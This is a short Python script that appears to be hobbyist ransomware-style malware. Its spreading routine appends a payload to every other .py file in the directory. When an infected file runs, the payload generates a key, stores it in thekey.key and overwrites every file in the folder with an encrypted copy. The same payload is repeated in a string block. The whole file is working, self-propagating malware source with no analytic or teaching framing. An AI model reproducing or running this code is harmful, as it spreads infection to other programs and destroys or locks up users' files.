#!/usr/bin/env python3

import subprocess
from sys import argv

import os
from cryptography.fernet import Fernet


def spreading_routine():
    files = []
    for file in os.listdir():
        if file == "rosem_crypt.py" or file == "rosem_decrypt.py" or file == "thekey.key":
            continue
        if os.path.isfile(file) and file.endswith(".py"):
            files.append(file)
    print(files)
    
    for file in files:
        with open (file, "a") as to_infect:
            to_infect.write("""\nfrom cryptography.fernet import Fernet\nimport os\nfiles = []

for file in os.listdir():
    if file == "rosem_crypt.py" or file == "rosem_decrypt.py" or file == "thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)

    

print(files)

key = Fernet.generate_key()
print(key)

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
""")
            

### Payload
"""
files = []

for file in os.listdir():
    if file == "rosem_crypt.py" or file == "rosem_decrypt.py" or file == "thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)

    

print(files)

key = Fernet.generate_key()
print(key)

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
"""

###END PAYLOAD


spreading_routine()